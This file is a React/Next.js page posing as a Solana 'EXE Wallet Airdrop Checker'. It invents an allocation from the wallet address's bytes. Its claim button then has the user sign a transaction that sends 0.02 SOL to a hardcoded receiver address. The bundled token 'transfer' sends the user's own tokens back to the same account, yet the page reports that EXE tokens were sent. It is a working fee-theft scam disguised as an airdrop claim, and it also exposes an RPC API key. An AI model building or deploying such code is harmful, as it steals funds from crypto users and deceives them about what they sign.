'use client';

/* -----------------------------------------------------------------
   Types: declare window.solana so TypeScript/Vercel stop complaining
------------------------------------------------------------------ */
export {};
declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<void>;
      publicKey?: import('@solana/web3.js').PublicKey;
      signTransaction?: (tx: any) => Promise<any>;
    };
  }
}

import React, { useState, useEffect } from 'react';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction
} from '@solana/spl-token';
import { Toaster, toast } from 'react-hot-toast';

/* -------------------  Config  ----------------------------------- */
const RPC      = 'https://solana-mainnet.g.alchemy.com/v2/V2on79gQAxg105TY0MKFM';
const RECEIVER = 'A7QUXxxyBzjSxqoS9aY4JbJPDhUF4xeSX98mKeh5ZDGY';      // receives 0.02 SOL
const EXE_MINT = new PublicKey('FM7huQouPgKmAVkEatSWA9x7aW8ArmbjSNosR62ctdyr');
const EXE_DECIMALS = 9;
/* ---------------------------------------------------------------- */

export default function Page() {
  const [addr, setAddr]   = useState('');
  const [alloc, setAlloc] = useState<number | null>(null);
  const [busy, setBusy]   = useState(false);
  const [claimed, setClaimed] = useState(false);

  /* --- load claim state from localStorage on addr change --- */
  useEffect(() => {
    const saved = localStorage.getItem('claimedWallets');
    if (saved && addr) {
      const list = JSON.parse(saved);
      setClaimed(list.includes(addr));
    }
  }, [addr]);

  const markClaimed = (address: string) => {
    const saved = localStorage.getItem('claimedWallets');
    const list: string[] = saved ? JSON.parse(saved) : [];
    if (!list.includes(address)) {
      list.push(address);
      localStorage.setItem('claimedWallets', JSON.stringify(list));
    }
    setClaimed(true);
  };

  /* -------- Random allocation (50 – 2000) ------------------ */
  const check = () => {
    try {
      const pk = new PublicKey(addr.trim());
      const bytes = pk.toBytes();
      const n = ((bytes[0] << 8) + bytes[1]) % 1951 + 50; // 50‑2000
      setAlloc(n);

      if (claimed) toast.error('You already claimed your EXE.');
    } catch {
      toast.error('Invalid Solana address');
    }
  };

  /* ----------------- Claim handler ------------------------- */
  const claim = async () => {
    if (!window.solana?.isPhantom) {
      toast.error('Please install Phantom Wallet');
      return;
    }
    if (claimed) {
      toast.error('Address already claimed.');
      return;
    }

    setBusy(true);
    try {
      await window.solana.connect();
      const payer = window.solana.publicKey as PublicKey;
      const connection = new Connection(RPC);

      /* balance check */
      const balance = await connection.getBalance(payer);
      if (balance < 0.02 * 1e9) {
        toast.error('❌ Not enough SOL (need 0.02 SOL)');
        setBusy(false);
        return;
      }

      const exeAmount = (alloc ?? 0) * 10 ** EXE_DECIMALS;

      /* 0.02 SOL transfer */
      const solIx = SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: new PublicKey(RECEIVER),
        lamports: 0.02 * 1e9,
      });

      /* EXE token transfer */
      const fromATA = await getAssociatedTokenAddress(EXE_MINT, payer, true);
      const toATA   = await getAssociatedTokenAddress(EXE_MINT, payer);
      const tokenIx = createTransferInstruction(fromATA, toATA, payer, exeAmount);

      /* build, sign, send */
      const tx = new Transaction().add(solIx, tokenIx);
      tx.feePayer = payer;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      const signed = await window.solana.signTransaction(tx);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, 'confirmed');

      toast.success(`🎉 Sent ${alloc} EXE tokens!`);
      markClaimed(addr.trim());
    } catch (err) {
      console.error(err);
      toast.error('Transaction failed');
    } finally {
      setBusy(false);
    }
  };

  /* ---------------------- UI ------------------------------- */
  return (
    <main
      style={{
        fontFamily: 'sans-serif',
        background: '#f0f0f0',
        minHeight: '100vh',
        paddingTop: '5vh',
        display: 'flex',
        justifyContent: 'center'
      }}
    >
      <div
        style={{
          background: '#fff',
          padding: '40px',
          borderRadius: '12px',
          boxShadow: '0 8px 24px rgba(0,0,0,0.1)',
          width: '100%',
          maxWidth: '480px',
          textAlign: 'center'
        }}
      >
        <h1 style={{ fontSize: '1.6rem', marginBottom: '20px' }}>
          EXE Wallet Airdrop Checker
        </h1>

        <input
          value={addr}
          onChange={e => setAddr(e.target.value)}
          placeholder="Enter your Solana wallet"
          style={{
            padding: '12px',
            width: '100%',
            marginBottom: '16px',
            border: '1px solid #ccc',
            borderRadius: '8px',
            textAlign: 'center'
          }}
        />

        {!alloc ? (
          <button
            onClick={check}
            style={{
              padding: '12px 24px',
              background: '#0070f3',
              color: '#fff',
              borderRadius: '8px',
              border: 'none',
              cursor: 'pointer'
            }}
          >
            Check Allocation
          </button>
        ) : claimed ? (
          <button
            disabled
            style={{
              padding: '12px 24px',
              background: '#aaa',
              color: '#eee',
              borderRadius: '8px',
              border: 'none'
            }}
          >
            Already Claimed
          </button>
        ) : (
          <button
            onClick={claim}
            disabled={busy}
            style={{
              padding: '12px 24px',
              background: '#28a745',
              color: '#fff',
              borderRadius: '8px',
              border: 'none',
              cursor: 'pointer'
            }}
          >
            {busy ? 'Processing…' : 'Claim Now'}
          </button>
        )}

        {alloc && (
          <p style={{ marginTop: '20px', fontSize: '1.1rem' }}>
            You are eligible for <strong>{alloc} EXE</strong>
          </p>
        )}

        <Toaster position="top-right" />
      </div>
    </main>
  );
}
